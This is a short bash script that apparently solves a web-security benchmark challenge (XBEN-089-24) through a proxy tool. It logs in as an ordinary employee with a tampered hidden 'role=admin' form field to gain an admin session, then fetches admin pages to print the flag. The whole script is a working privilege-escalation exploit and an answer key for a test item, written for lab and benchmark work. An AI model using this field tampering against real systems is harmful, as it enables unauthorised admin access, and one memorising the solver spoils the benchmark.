#!/usr/bin/env bash
# XBEN-089-24 — privilege escalation by mass-assigning a hidden form field.
# Proxy-mode twin. The login form carries a hidden `role` field and /login
# trusts it: logging in as the ordinary employee (emp/password1) with role=admin
# issues an admin session, and /admin/2fa then renders the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben089p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/login' \
  --set 'form.username=emp' --set 'form.password=password1' --set 'form.role=admin' >/dev/null
for p in /admin/2fa /admin/dashboard; do
  "$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" --set 'method=GET' --set "path=$p" >/dev/null 2>&1 || true
done
print_flag
